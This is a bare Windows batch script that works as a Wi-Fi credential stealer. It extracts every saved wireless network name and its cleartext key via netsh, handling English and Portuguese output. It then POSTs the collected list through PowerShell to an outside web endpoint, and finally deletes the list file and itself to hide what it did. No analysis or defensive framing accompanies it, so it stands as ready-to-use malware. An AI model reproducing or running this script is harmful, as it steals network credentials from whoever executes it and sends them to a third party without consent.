@echo off
setlocal enabledelayedexpansion
echo Wifi Passwords > list.txt
for /f "skip=9 tokens=1,2 delims=:" %%i in ('netsh wlan show profiles') do (
    set "network_name=%%j"
    :: Remove any leading spaces from the network name
    set "network_name=!network_name:~1!"
    
    :: Get the Wi-Fi password for each profile
    for /f "tokens=2 delims=:" %%a in ('netsh wlan show profiles "!network_name!" key^=clear ^| findstr /c:"Key Content"') do (
        set "password=%%a"
        :: Remove any leading spaces from the password
        set "password=!password:~1!"
        
		echo =============================== >> list.txt
        :: Write the network name and password to the file
        echo SSID: !network_name! >> list.txt
		echo KEY: !password! >> list.txt
    )
	for /f "tokens=2 delims=:" %%a in ('netsh wlan show profiles "!network_name!" key^=clear ^| findstr /c:"da Chave"') do (
        set "password=%%a"
        :: Remove any leading spaces from the password
        set "password=!password:~1!"
        
		echo =============================== >> list.txt
        :: Write the network name and password to the file
        echo SSID: !network_name! >> list.txt
		echo KEY: !password! >> list.txt
    )
)
powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-RestMethod -Uri 'https://d-n0pt.onrender.com/send-email' -Method Post -Body (@{ emailBody = Get-Content -Path 'list.txt' } | ConvertTo-Json) -ContentType 'application/json'"

echo =============================== >> list.txt
del "list.txt"
del "%~f0"s
